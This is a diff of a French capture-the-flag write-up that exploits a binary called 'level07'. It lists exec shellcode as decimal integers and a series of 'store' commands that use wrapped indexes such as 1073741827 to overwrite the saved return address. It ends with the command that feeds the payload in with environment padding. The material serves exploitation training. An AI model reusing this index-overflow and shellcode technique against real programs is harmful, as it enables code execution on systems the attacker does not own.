@@ -42,30 +42,44 @@ on genere un shellcode avec la commande : "shellcode generate x86/linux exec"
 
 On le convertie en decimal par morceau de 4 octects et on le store a l'adresse 1, 2, 3 ...
 
-shellcode convertie = 834687080 791638888 1747935849 1854530353 3381250666 190369152
-
-shotcut : 
-
-store
-834687080
-1
-store
-791638888
-2
-store
-1747935849
-1073741827
-store
-4
-1854530353
-store
-5
-3381250666
-store
-190369152
-1073741810
-
+shellcode convertie en decimal big endian =
+1750122545
+1752379183
+1768042344
+836995438
+1791658441
+2160941067
 
 Donc apres avoir mis le breakpoint, on ecrase eip, on delete le breakpoint
 et on store notre shellcode puis on quitte
+
+On stock notre shellcode a partir du 3eme index pour etre aligner.
+0xffffd540
+1073741824 + 3 = 1073741827
+
+store
+1750122545
+1073741827
+store
+1752379183
+4
+store
+1768042344
+5
+store
+836995438
+1073741830
+store
+1791658441
+7
+store
+2160941067
+8
+store
+4294956352
+1073741938
+quit
+
+cat /tmp/payload - | env a=aaaaaaaaaaaaaaaaaaaaaaaaaaaaa ./level07 # padding avec 
+l'env decaller de gdb
 
